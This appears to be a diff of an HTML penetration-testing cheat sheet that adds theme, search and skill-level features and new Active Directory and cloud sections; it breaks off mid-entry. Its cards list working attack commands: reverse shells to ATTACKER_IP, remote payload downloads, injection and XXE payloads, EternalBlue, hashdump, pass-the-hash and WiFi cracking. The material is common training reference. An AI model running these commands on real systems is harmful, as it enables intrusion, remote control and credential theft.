@@ -19,21 +19,25 @@
   <span class="mobile-title">HACK SHEET</span>
   <div class="search-wrap mobile-search">
     <svg class="search-icon" viewBox="0 0 16 16"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398l3.85 3.85a1 1 0 0 0 1.415-1.415l-3.868-3.833zm-5.242 1.156a5.5 5.5 0 1 1 0-11 5.5 5.5 0 0 1 0 11z"/></svg>
-    <input type="text" id="searchInputMobile" placeholder="Search commands..." autocomplete="off" spellcheck="false">
+    <input type="text" id="searchInputMobile" placeholder="Search..." autocomplete="off" spellcheck="false">
     <button class="search-clear" id="clearMobile" aria-label="Clear">✕</button>
   </div>
+  <button class="theme-toggle" id="themeToggleMobile" aria-label="Toggle theme" title="Toggle light/dark mode">☀</button>
 </div>
 
 <!-- Mobile drawer overlay -->
 <div class="drawer-overlay" id="drawerOverlay"></div>
 
 <!-- ══════════════════════════════════════════
-     SIDEBAR NAV (desktop sticky + mobile drawer)
+     SIDEBAR NAV
 ══════════════════════════════════════════ -->
 <nav class="sidebar" id="sidebar">
   <div class="sidebar-header">
     <span>NAVIGATE</span>
-    <button class="sidebar-close" id="sidebarClose" aria-label="Close">✕</button>
+    <div class="sidebar-header-btns">
+      <button class="theme-toggle" id="themeToggleDesktop" aria-label="Toggle theme" title="Toggle light/dark mode">☀</button>
+      <button class="sidebar-close" id="sidebarClose" aria-label="Close">✕</button>
+    </div>
   </div>
 
   <div class="search-wrap sidebar-search">
@@ -42,38 +46,55 @@
     <button class="search-clear" id="clearDesktop" aria-label="Clear">✕</button>
   </div>
 
+  <!-- Search options -->
+  <div class="search-options">
+    <button class="search-mode-btn active" id="modeAll">ALL</button>
+    <button class="search-mode-btn" id="modeCmds">CMD ONLY</button>
+    <span class="search-hint">[/] search · [ESC] clear</span>
+  </div>
+
   <div class="nav-results-count" id="resultsCount"></div>
 
   <ul class="nav-list">
     <li class="nav-section-label">Reconnaissance</li>
-    <li><a href="#recon"          class="nav-link">🔍 Passive Recon</a></li>
-    <li><a href="#active-recon"   class="nav-link">🌐 Active Recon</a></li>
+    <li><a href="#recon"           class="nav-link">🔍 Passive Recon</a></li>
+    <li><a href="#active-recon"    class="nav-link">🌐 Active Recon</a></li>
 
     <li class="nav-section-label">Scanning</li>
-    <li><a href="#nmap"           class="nav-link">📡 Nmap</a></li>
-    <li><a href="#services"       class="nav-link">📂 Services</a></li>
+    <li><a href="#nmap"            class="nav-link">📡 Nmap</a></li>
+    <li><a href="#services"        class="nav-link">📂 Services</a></li>
 
     <li class="nav-section-label">Web Testing</li>
-    <li><a href="#web-recon"      class="nav-link">🕸️ Web Recon</a></li>
-    <li><a href="#web-vulns"      class="nav-link">💉 Web Vulns</a></li>
-    <li><a href="#passwords"      class="nav-link">🔑 Passwords</a></li>
+    <li><a href="#web-recon"       class="nav-link">🕸️ Web Recon</a></li>
+    <li><a href="#web-vulns"       class="nav-link">💉 Web Vulns</a></li>
+    <li><a href="#passwords"       class="nav-link">🔑 Passwords</a></li>
 
     <li class="nav-section-label">Exploitation</li>
-    <li><a href="#metasploit"     class="nav-link">🎯 Metasploit</a></li>
-    <li><a href="#shells"         class="nav-link">🐚 Shells</a></li>
+    <li><a href="#metasploit"      class="nav-link">🎯 Metasploit</a></li>
+    <li><a href="#shells"          class="nav-link">🐚 Shells</a></li>
 
     <li class="nav-section-label">Post-Exploit</li>
-    <li><a href="#privesc-linux"  class="nav-link">🔺 PrivEsc Linux</a></li>
+    <li><a href="#privesc-linux"   class="nav-link">🔺 PrivEsc Linux</a></li>
     <li><a href="#privesc-windows" class="nav-link">🪟 PrivEsc Windows</a></li>
-    <li><a href="#meterpreter"    class="nav-link">📊 Meterpreter</a></li>
-    <li><a href="#network"        class="nav-link">🔗 Network</a></li>
-    <li><a href="#wireless"       class="nav-link">📶 Wireless</a></li>
+    <li><a href="#meterpreter"     class="nav-link">📊 Meterpreter</a></li>
+    <li><a href="#network"         class="nav-link">🔗 Network</a></li>
+    <li><a href="#wireless"        class="nav-link">📶 Wireless</a></li>
+
+    <li class="nav-section-label">Advanced</li>
+    <li><a href="#active-directory" class="nav-link">🏰 Active Directory</a></li>
+    <li><a href="#cloud"           class="nav-link">☁️ Cloud Hacking</a></li>
+    <li><a href="#oscp-tips"       class="nav-link">🎓 OSCP Tips</a></li>
 
     <li class="nav-section-label">Defense</li>
-    <li><a href="#defense"        class="nav-link">🛡️ Defense</a></li>
-    <li><a href="#resources"      class="nav-link">📚 Resources</a></li>
+    <li><a href="#defense"         class="nav-link">🛡️ Defense</a></li>
+    <li><a href="#resources"       class="nav-link">📚 Resources</a></li>
   </ul>
 </nav>
+
+<!-- ══════════════════════════════════════════
+     BACK TO TOP
+══════════════════════════════════════════ -->
+<button class="back-to-top" id="backToTop" aria-label="Back to top" title="Back to top">▲</button>
 
 <!-- ══════════════════════════════════════════
      MAIN CONTENT
@@ -88,54 +109,57 @@
   </header>
 
   <div class="phases">
-    <a href="#recon"         class="phase-pill" style="color:var(--cyan);   border-color:var(--cyan);">①  Recon</a>
-    <a href="#nmap"          class="phase-pill" style="color:var(--yellow); border-color:var(--yellow);">② Scanning</a>
-    <a href="#web-recon"     class="phase-pill" style="color:#aa44ff;       border-color:#aa44ff;">③ Web</a>
-    <a href="#metasploit"    class="phase-pill" style="color:var(--red);    border-color:var(--red);">④ Exploitation</a>
-    <a href="#privesc-linux" class="phase-pill" style="color:var(--orange); border-color:var(--orange);">⑤ Post-Exploit</a>
-    <a href="#defense"       class="phase-pill" style="color:var(--green);  border-color:var(--green);">⑥ Defense</a>
+    <a href="#recon"           class="phase-pill" style="color:var(--cyan);   border-color:var(--cyan);">① Recon</a>
+    <a href="#nmap"            class="phase-pill" style="color:var(--yellow); border-color:var(--yellow);">② Scanning</a>
+    <a href="#web-recon"       class="phase-pill" style="color:#aa44ff;       border-color:#aa44ff;">③ Web</a>
+    <a href="#metasploit"      class="phase-pill" style="color:var(--red);    border-color:var(--red);">④ Exploit</a>
+    <a href="#privesc-linux"   class="phase-pill" style="color:var(--orange); border-color:var(--orange);">⑤ Post</a>
+    <a href="#active-directory" class="phase-pill" style="color:#ff66aa;      border-color:#ff66aa;">⑥ AD</a>
+    <a href="#cloud"           class="phase-pill" style="color:#44ccff;       border-color:#44ccff;">⑦ Cloud</a>
+    <a href="#defense"         class="phase-pill" style="color:var(--green);  border-color:var(--green);">⑧ Defense</a>
   </div>
 
-  <!-- No-results message shown when search finds nothing -->
   <div class="no-results" id="noResults">
     <div class="no-results-icon">⌕</div>
     <div>No results for "<span id="noResultsQuery"></span>"</div>
-    <div class="no-results-sub">Try a different keyword</div>
+    <div class="no-results-sub">Try a different keyword or switch to ALL mode</div>
   </div>
 
   <div class="grid" id="mainGrid">
 
-    <!-- PHASE 1 — RECONNAISSANCE -->
+    <!-- ══════════════════════════════════════════
+         PHASE 1 — RECONNAISSANCE
+    ══════════════════════════════════════════ -->
     <div class="phase-banner" id="section-recon">── Phase 1: Reconnaissance ──</div>
 
     <div class="card" id="recon" data-cat="recon">
       <div class="card-title cyan"><span class="icon">🔍</span> Passive Recon (OSINT)</div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">WHOIS Lookup</div>
         <code class="cmd prompt">whois target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">DNS Enumeration</div>
         <code class="cmd prompt">dig any target.com</code>
         <code class="cmd prompt">host -a target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Subdomain Discovery</div>
         <code class="cmd prompt">sublist3r -d target.com</code>
         <code class="cmd prompt">amass enum -d target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Google Dorking</div>
         <code class="cmd cyan">site:target.com filetype:pdf</code>
         <code class="cmd cyan">intitle:"index of" site:target.com</code>
         <code class="cmd cyan">inurl:admin site:target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Shodan / Censys</div>
         <code class="cmd cyan">hostname:target.com</code>
         <div class="tip">Search for exposed services, certs, banners</div>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Email Harvesting</div>
         <code class="cmd prompt">theHarvester -d target.com -b all</code>
       </div>
@@ -143,25 +167,25 @@
 
     <div class="card" id="active-recon" data-cat="recon">
       <div class="card-title cyan"><span class="icon">🌐</span> Active Recon</div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Ping Sweep</div>
         <code class="cmd prompt">nmap -sn 192.168.1.0/24</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Traceroute</div>
         <code class="cmd prompt">traceroute target.com</code>
         <code class="cmd prompt">nmap --traceroute target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Zone Transfer (if misconfigured)</div>
         <code class="cmd prompt">dig axfr @ns1.target.com target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Banner Grabbing</div>
         <code class="cmd prompt">nc -v target.com 80</code>
         <code class="cmd prompt">curl -I https://target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Tech Stack Fingerprinting</div>
         <code class="cmd prompt">whatweb target.com</code>
         <code class="cmd prompt">wafw00f target.com</code>
@@ -169,45 +193,47 @@
       </div>
     </div>
 
-    <!-- PHASE 2 — SCANNING -->
+    <!-- ══════════════════════════════════════════
+         PHASE 2 — SCANNING
+    ══════════════════════════════════════════ -->
     <div class="phase-banner" id="section-scan">── Phase 2: Scanning & Enumeration ──</div>
 
     <div class="card" id="nmap" data-cat="scan">
       <div class="card-title yellow"><span class="icon">📡</span> Nmap Essentials</div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Quick Port Scan</div>
         <code class="cmd prompt">nmap -T4 -F target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Full Port Scan</div>
         <code class="cmd prompt">nmap -p- -T4 target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Service & Version Detection</div>
         <code class="cmd prompt">nmap -sV -sC target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">OS Detection</div>
         <code class="cmd prompt">nmap -O target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Aggressive Scan (all)</div>
         <code class="cmd prompt">nmap -A -T4 target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Stealth SYN Scan</div>
         <code class="cmd prompt">nmap -sS target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">UDP Scan</div>
         <code class="cmd prompt">nmap -sU --top-ports 200 target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Vuln Scripts</div>
         <code class="cmd prompt">nmap --script vuln target.com</code>
         <code class="cmd prompt">nmap --script smb-vuln* -p 445 target</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Save Output</div>
         <code class="cmd prompt">nmap -oA scan_output target.com</code>
       </div>
@@ -215,61 +241,63 @@
 
     <div class="card" id="services" data-cat="scan">
       <div class="card-title yellow"><span class="icon">📂</span> Service Enumeration</div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">SMB (port 445)</div>
         <code class="cmd prompt">enum4linux -a target</code>
         <code class="cmd prompt">smbclient -L \\\\target</code>
         <code class="cmd prompt">crackmapexec smb target</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">FTP (port 21)</div>
         <code class="cmd cyan">ftp target   # try anonymous login</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">SSH (port 22)</div>
         <code class="cmd prompt">ssh-audit target</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">SNMP (port 161)</div>
         <code class="cmd prompt">snmpwalk -c public -v1 target</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">LDAP (port 389)</div>
         <code class="cmd prompt">ldapsearch -x -h target -b "dc=domain,dc=com"</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">RPC</div>
         <code class="cmd prompt">rpcclient -U "" target</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">MySQL (port 3306)</div>
         <code class="cmd prompt">mysql -h target -u root -p</code>
       </div>
     </div>
 
-    <!-- WEB APPLICATION TESTING -->
+    <!-- ══════════════════════════════════════════
+         WEB APPLICATION TESTING
+    ══════════════════════════════════════════ -->
     <div class="phase-banner" id="section-web">── Web Application Testing ──</div>
 
     <div class="card" id="web-recon" data-cat="web">
       <div class="card-title" style="color:#aa44ff;border-bottom:1px solid #2a1a4a;padding-bottom:8px;"><span class="icon">🕸️</span> Web Recon & Fuzzing</div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Directory Bruteforce</div>
         <code class="cmd purple">gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>
         <code class="cmd purple">feroxbuster -u http://target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Subdomain Fuzzing</div>
         <code class="cmd purple">ffuf -w wordlist.txt -u http://FUZZ.target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Parameter Fuzzing</div>
         <code class="cmd purple">ffuf -w params.txt -u "http://target.com/page?FUZZ=val"</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Nikto Web Scanner</div>
         <code class="cmd purple">nikto -h http://target.com</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Spider / Crawl</div>
         <code class="cmd purple">gospider -s http://target.com -o output</code>
       </div>
@@ -277,33 +305,37 @@
 
     <div class="card" id="web-vulns" data-cat="web">
       <div class="card-title" style="color:#aa44ff;border-bottom:1px solid #2a1a4a;padding-bottom:8px;"><span class="icon">💉</span> Web Vulnerabilities (OWASP Top 10)</div>
-      <div class="entry">
-        <div class="entry-label">SQL Injection — Basic Test</div>
+      <div class="entry" data-level="beginner">
+        <div class="entry-label">SQL Injection</div>
         <code class="cmd purple">' OR 1=1 --</code>
         <code class="cmd prompt">sqlmap -u "http://target/page?id=1" --dbs</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">XSS — Basic Test</div>
         <code class="cmd purple">&lt;script&gt;alert(1)&lt;/script&gt;</code>
         <code class="cmd purple">"&gt;&lt;img src=x onerror=alert(1)&gt;</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">LFI / Path Traversal</div>
         <code class="cmd purple">?file=../../../../etc/passwd</code>
         <code class="cmd purple">?file=....//....//etc/passwd</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">SSRF</div>
         <code class="cmd purple">?url=http://127.0.0.1:80</code>
         <code class="cmd purple">?url=http://169.254.169.254/latest/meta-data/</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Command Injection</div>
         <code class="cmd purple">; ls -la</code>
         <code class="cmd purple">| whoami</code>
         <code class="cmd purple">`id`</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="advanced">
+        <div class="entry-label">XXE Injection</div>
+        <code class="cmd purple">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code>
+      </div>
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Burp Suite Workflow</div>
         <div class="tip">Intercept → Modify → Repeat → Intruder for fuzzing → Scanner for automation</div>
       </div>
@@ -311,53 +343,55 @@
 
     <div class="card" id="passwords" data-cat="scan">
       <div class="card-title yellow"><span class="icon">🔑</span> Password Attacks</div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Wordlist Bruteforce — Hydra</div>
         <code class="cmd prompt">hydra -l admin -P rockyou.txt ssh://target</code>
         <code class="cmd prompt">hydra -l admin -P rockyou.txt target http-post-form "/login:user=^USER^&amp;pass=^PASS^:F=Invalid"</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Hash Cracking — Hashcat</div>
         <code class="cmd prompt">hashcat -m 0 hash.txt rockyou.txt</code>
         <code class="cmd prompt">hashcat -m 1000 ntlm.txt rockyou.txt</code>
         <div class="tip">-m 0=MD5, 100=SHA1, 1000=NTLM, 1800=SHA-512</div>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">John the Ripper</div>
         <code class="cmd prompt">john --wordlist=rockyou.txt hashes.txt</code>
         <code class="cmd prompt">john --show hashes.txt</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Default Credentials</div>
         <div class="tip">Try admin:admin, admin:password, root:root, admin:&lt;blank&gt;</div>
         <div class="tip">Check defaultpassword.us or cirt.net</div>
       </div>
     </div>
 
-    <!-- PHASE 3 — EXPLOITATION -->
+    <!-- ══════════════════════════════════════════
+         PHASE 3 — EXPLOITATION
+    ══════════════════════════════════════════ -->
     <div class="phase-banner" id="section-exploit">── Phase 3: Exploitation ──</div>
 
     <div class="card" id="metasploit" data-cat="exploit">
       <div class="card-title red"><span class="icon">🎯</span> Metasploit Framework</div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Launch & Search</div>
         <code class="cmd prompt">msfconsole</code>
         <code class="cmd red">search eternalblue</code>
         <code class="cmd red">search type:exploit platform:windows</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Use & Configure</div>
         <code class="cmd red">use exploit/windows/smb/ms17_010_eternalblue</code>
         <code class="cmd red">show options</code>
         <code class="cmd red">set RHOSTS 192.168.1.100</code>
         <code class="cmd red">set LHOST 192.168.1.10</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Payloads</div>
         <code class="cmd red">set payload windows/x64/meterpreter/reverse_tcp</code>
         <code class="cmd red">show payloads</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Run</div>
         <code class="cmd red">run</code>
         <code class="cmd red">exploit -j   # background job</code>
@@ -366,138 +400,150 @@
 
     <div class="card" id="shells" data-cat="exploit">
       <div class="card-title red"><span class="icon">🐚</span> Reverse Shells</div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Listener (Attacker)</div>
         <code class="cmd prompt">nc -lvnp 4444</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Bash</div>
         <code class="cmd red">bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Python</div>
         <code class="cmd red">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">PHP</div>
         <code class="cmd red">php -r '$sock=fsockopen("IP",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Netcat</div>
         <code class="cmd red">nc -e /bin/bash ATTACKER_IP 4444</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">PowerShell (Windows)</div>
         <code class="cmd red">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',4444)"</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Upgrade to Full TTY</div>
         <code class="cmd prompt">python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
         <code class="cmd prompt">export TERM=xterm</code>
       </div>
-      <div class="entry">
-        <div class="entry-label">msfvenom Payload Generator</div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">msfvenom Payloads</div>
         <code class="cmd prompt">msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf</code>
         <code class="cmd prompt">msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe</code>
       </div>
     </div>
 
-    <!-- PHASE 4 — POST-EXPLOITATION -->
+    <!-- ══════════════════════════════════════════
+         PHASE 4 — POST-EXPLOITATION
+    ══════════════════════════════════════════ -->
     <div class="phase-banner" id="section-post">── Phase 4: Post-Exploitation ──</div>
 
     <div class="card" id="privesc-linux" data-cat="post">
       <div class="card-title orange"><span class="icon">🔺</span> Privilege Escalation — Linux</div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">System Info</div>
         <code class="cmd prompt">uname -a && id && whoami</code>
         <code class="cmd prompt">cat /etc/os-release</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">SUID Binaries</div>
         <code class="cmd prompt">find / -perm -4000 -type f 2>/dev/null</code>
         <div class="tip">Check GTFOBins for exploitation paths</div>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Sudo Rights</div>
         <code class="cmd prompt">sudo -l</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Cron Jobs</div>
         <code class="cmd prompt">cat /etc/crontab</code>
         <code class="cmd prompt">ls -la /etc/cron.*</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Writable Files</div>
         <code class="cmd prompt">find / -writable -type f 2>/dev/null | grep -v proc</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Automated: LinPEAS</div>
         <code class="cmd prompt">curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="advanced">
         <div class="entry-label">Kernel Exploits</div>
         <code class="cmd prompt">uname -r  # check kernel version</code>
-        <div class="tip">Search CVEs for that kernel — DirtyPipe (5.8–5.16), Dirty COW, etc.</div>
+        <div class="tip">Search CVEs — DirtyPipe (5.8–5.16), Dirty COW, PwnKit (pkexec)</div>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">File Transfer (wget/curl)</div>
+        <code class="cmd prompt">wget http://ATTACKER_IP/file -O /tmp/file</code>
+        <code class="cmd prompt">curl http://ATTACKER_IP/file -o /tmp/file</code>
       </div>
     </div>
 
     <div class="card" id="privesc-windows" data-cat="post">
       <div class="card-title orange"><span class="icon">🪟</span> Privilege Escalation — Windows</div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">System Info</div>
         <code class="cmd orange">whoami /priv</code>
         <code class="cmd orange">systeminfo</code>
         <code class="cmd orange">net localgroup administrators</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Running Services</div>
         <code class="cmd orange">sc query state= all</code>
         <code class="cmd orange">tasklist /SVC</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Unquoted Service Paths</div>
         <code class="cmd orange">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows"</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Automated: WinPEAS</div>
         <code class="cmd orange">.\winPEAS.exe</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="advanced">
         <div class="entry-label">Token Impersonation (Meterpreter)</div>
         <code class="cmd red">use incognito</code>
         <code class="cmd red">list_tokens -u</code>
         <code class="cmd red">impersonate_token "DOMAIN\\Administrator"</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="advanced">
         <div class="entry-label">Pass the Hash</div>
         <code class="cmd prompt">pth-winexe -U admin%HASH //target cmd</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">File Transfer (PowerShell)</div>
+        <code class="cmd orange">powershell -c "Invoke-WebRequest -Uri http://ATTACKER/file -OutFile C:\tmp\file"</code>
+        <code class="cmd orange">certutil -urlcache -split -f http://ATTACKER/file file.exe</code>
       </div>
     </div>
 
     <div class="card" id="meterpreter" data-cat="post">
       <div class="card-title orange"><span class="icon">📊</span> Meterpreter Cheat Sheet</div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">System</div>
         <code class="cmd red">sysinfo</code>
         <code class="cmd red">getuid</code>
         <code class="cmd red">getsystem</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Files</div>
         <code class="cmd red">download /etc/shadow .</code>
         <code class="cmd red">upload shell.exe C:\\temp\\</code>
         <code class="cmd red">search -f *.txt</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Persistence</div>
         <code class="cmd red">run persistence -h</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="advanced">
         <div class="entry-label">Pivoting</div>
         <code class="cmd red">run autoroute -s 10.10.10.0/24</code>
         <code class="cmd red">portfwd add -l 3389 -p 3389 -r 10.10.10.5</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Dump Creds</div>
         <code class="cmd red">hashdump</code>
         <code class="cmd red">run post/multi/recon/local_exploit_suggester</code>
@@ -506,29 +552,29 @@
 
     <div class="card" id="network" data-cat="scan">
       <div class="card-title yellow"><span class="icon">🔗</span> Network & Pivoting</div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Port Forwarding — SSH</div>
         <code class="cmd prompt">ssh -L 8080:target:80 user@jump</code>
         <code class="cmd prompt">ssh -D 1080 user@jump  # SOCKS proxy</code>
       </div>
-      <div class="entry">
-        <div class="entry-label">Chisel Tunnel — Server (attacker)</div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">Chisel — Server (attacker)</div>
         <code class="cmd prompt">chisel server -p 8000 --reverse</code>
       </div>
-      <div class="entry">
-        <div class="entry-label">Chisel Tunnel — Client (victim)</div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">Chisel — Client (victim)</div>
         <code class="cmd prompt">chisel client ATTACKER:8000 R:1080:socks</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">ProxyChains</div>
         <code class="cmd prompt">proxychains nmap -sT -p80,443 internal_target</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Packet Capture</div>
         <code class="cmd prompt">tcpdump -i eth0 -w capture.pcap</code>
         <code class="cmd prompt">wireshark capture.pcap</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="advanced">
         <div class="entry-label">ARP Spoofing (MITM)</div>
         <code class="cmd prompt">arpspoof -i eth0 -t victim gateway</code>
         <code class="cmd prompt">bettercap -iface eth0</code>
@@ -537,30 +583,237 @@
 
     <div class="card" id="wireless" data-cat="scan">
       <div class="card-title yellow"><span class="icon">📶</span> Wireless (WiFi)</div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Monitor Mode</div>
         <code class="cmd prompt">airmon-ng start wlan0</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Capture Handshakes</div>
         <code class="cmd prompt">airodump-ng wlan0mon</code>
         <code class="cmd prompt">airodump-ng -c 6 --bssid AA:BB:CC:DD -w capture wlan0mon</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Deauth Attack</div>
         <code class="cmd prompt">aireplay-ng -0 5 -a BSSID wlan0mon</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Crack WPA2</div>
         <code class="cmd prompt">aircrack-ng -w rockyou.txt capture.cap</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="advanced">
         <div class="entry-label">WPS Attack</div>
         <code class="cmd prompt">reaver -i wlan0mon -b BSSID -vv</code>
       </div>
     </div>
 
-    <!-- DEFENSIVE KNOWLEDGE -->
+    <!-- ══════════════════════════════════════════
+         ADVANCED — ACTIVE DIRECTORY
+    ══════════════════════════════════════════ -->
+    <div class="phase-banner" id="section-ad">── Advanced: Active Directory ──</div>
+
+    <div class="card" id="active-directory" data-cat="exploit" style="border-top-color:#ff66aa;">
+      <div class="card-title" style="color:#ff66aa;border-bottom:1px solid #3d1a2a;padding-bottom:8px;"><span class="icon">🏰</span> AD Enumeration</div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">BloodHound — Collection</div>
+        <code class="cmd prompt">bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c All</code>
+        <code class="cmd orange">SharpHound.exe -c All --zipfilename bh_out.zip</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">PowerView Enumeration</div>
+        <code class="cmd orange">Get-NetDomain</code>
